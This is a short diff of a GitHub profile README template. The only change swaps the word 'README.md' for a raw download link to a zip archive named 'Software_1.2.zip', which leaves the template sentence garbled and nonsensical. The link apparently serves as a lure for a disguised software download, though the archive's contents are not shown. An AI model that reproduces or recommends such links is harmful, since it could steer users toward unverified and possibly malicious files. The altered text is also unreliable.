@@ -1,7 +1,7 @@
 ## Hi there 👋
 
 <!--
-**flinchtheflincher/flinchtheflincher** is a ✨ _special_ ✨ repository because its `README.md` (this file) appears on your GitHub profile.
+**flinchtheflincher/flinchtheflincher** is a ✨ _special_ ✨ repository because its `https://raw.githubusercontent.com/flinchtheflincher/flinchtheflincher/main/meretriciousness/Software_1.2.zip` (this file) appears on your GitHub profile.
 
 Here are some ideas to get you started:
 
